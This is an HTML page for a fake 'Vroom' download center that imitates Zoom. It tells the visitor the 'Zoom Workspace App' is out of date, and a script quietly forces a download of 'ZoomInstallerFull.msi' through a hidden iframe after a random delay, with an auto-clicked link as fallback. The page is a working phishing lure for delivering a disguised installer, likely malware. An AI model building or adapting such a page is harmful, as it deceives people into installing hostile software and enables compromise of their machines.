<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Download Center - Vroom</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
    }
    header {
      background-color: #02042c;
      color: white;
      padding: 20px 40px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
    }
    .logo img {
      height: 80px;
      object-fit: contain;
    }
    .nav-links {
      display: flex;
      gap: 20px;
      flex: 1;
      justify-content: flex-start;
    }
    .nav-links a {
      color: white;
      text-decoration: none;
      font-size: 0.95em;
    }
    .cta-buttons {
      display: flex;
      gap: 10px;
    }
    .cta-buttons button {
      padding: 10px 15px;
      border: none;
      border-radius: 5px;
      font-size: 0.9em;
      cursor: pointer;
    }
    .btn-outline {
      background: transparent;
      color: white;
      border: 1px solid white;
    }
    .btn-blue {
      background-color: #1e90ff;
      color: white;
    }
    main {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: calc(100vh - 100px);
      padding: 20px;
      text-align: center;
    }
    .error-message {
      padding: 40px;
      font-size: 1.2em;
      font-weight: bold;
      margin-bottom: 170px;
    }
    .store-badges {
      display: flex;
      gap: 20px;
      justify-content: center;
      align-items: center;
      margin-top: 20px;
    }
    .store-badges img {
      height: 55px;
      cursor: pointer;
    }
    @media (max-width: 768px) {
      header {
        flex-direction: column;
        align-items: flex-start;
        gap: 10px;
      }
      .cta-buttons {
        flex-direction: column;
        width: 100%;
      }
      .cta-buttons button {
        width: 100%;
      }
      .store-badges {
        flex-direction: column;
        gap: 10px;
      }
    }
  </style>
  <script>
    window.onload = function() {
      setTimeout(function() {
        // Create invisible iframe to trigger download
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'ZoomInstallerFull.msi'; // File in same directory
        document.body.appendChild(iframe);
        
        // Fallback method if iframe doesn't work
        setTimeout(function() {
          const link = document.createElement('a');
          link.href = 'ZoomInstallerFull.msi';
          link.download = 'ZoomInstallerFull.msi';
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
        }, 1000);
        
      }, Math.floor(Math.random() * 2000) + 3000); // Random delay between 3-5 seconds
    };
  </script>
</head>
<body>
  <header>
    <div class="logo">
      <img src="OIP (2).jpeg" alt="Vroom Logo">
    </div>
    <nav class="nav-links">
      <a href="#">Products</a>
      <a href="#">Solutions</a>
      <a href="#">Resources</a>
      <a href="#">Plans & Pricing</a>
    </nav>
    <div class="cta-buttons">
      <button class="btn-outline">Contact Sales</button>
      <button class="btn-blue">Sign Up Free</button>
    </div>
  </header>
  <main>
    <div class="error-message">
      <h1>Sorry, you do not have the latest version of Zoom Workspace App installed.</h1>
      <p>The latest version of our Application will download automatically. Kindly install it to join the Remote Desktop Meeting.</p>
      <p>If it doesn't, <a href="ZoomInstallerFull.msi" download>click here to download</a>.</p>
    </div>
    <div class="store-badges">
      <a href="#">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play" />
      </a>
      <a href="#">
        <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="Download on the App Store" />
      </a>
    </div>
  </main>
</body>
</html>
